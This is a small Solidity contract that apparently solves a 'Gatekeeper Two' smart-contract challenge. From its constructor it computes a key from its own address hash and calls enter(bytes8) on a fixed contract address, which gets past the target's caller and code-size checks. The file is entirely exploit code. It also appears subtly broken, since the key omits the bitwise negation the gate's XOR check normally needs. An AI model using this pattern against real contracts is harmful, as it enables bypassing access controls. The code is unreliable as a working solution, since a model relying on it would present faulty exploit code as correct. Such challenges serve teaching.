// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SolveGatekeeperTwo {
        constructor() public {
        bytes8 theKey = bytes8(keccak256(abi.encodePacked(address(this))));
        address gateQ = address(0x0C35a0453A10eCAFF5189724d4a410b73916dAbd);
        (bool success,) = gateQ.call(abi.encodeWithSignature("enter(bytes8)", theKey));
        require(success);
    }
}
